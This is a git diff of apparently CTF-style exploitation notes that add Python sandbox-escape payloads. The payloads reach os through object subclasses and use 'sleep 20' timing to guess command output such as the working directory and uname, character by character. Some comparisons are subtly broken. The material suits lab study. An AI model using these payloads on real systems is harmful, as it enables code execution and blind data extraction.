@@ -96,10 +96,21 @@ for file_index in range(0,ndir):                             # This will be on a
 ```text
 # Commands lists
 
+# Skeleton command for below response, always check output on local machine first.
+i=().__class__.__bases__[0].__subclasses__()[59]()._module.__builtins__['__import__']('os')
+if i.popen('pwd| wc -l').read()[char_index]=='ele': i.system('sleep 20')
+
+
 # GUESS current working directory
 i=().__class__.__bases__[0].__subclasses__()[59]()._module.__builtins__['__import__']('os')
-if i.popen('pwd').read()[0]=='a': i.system('sleep 20')
+if i.popen('pwd').read()[char_index]=='ele': i.system('sleep 20')
 
-# GUESS 
+# GUESS Get length of output of returned os commad = 'uname'
+# note 'n' is a string not int, as output of command is string
+i=().__class__.__bases__[0].__subclasses__()[59]()._module.__builtins__['__import__']('os')
+if i.popen('uname').read()[:-1]=='n': i.system('sleep 20')
+
+# GUESS file names in current working directory
+
 ```
 
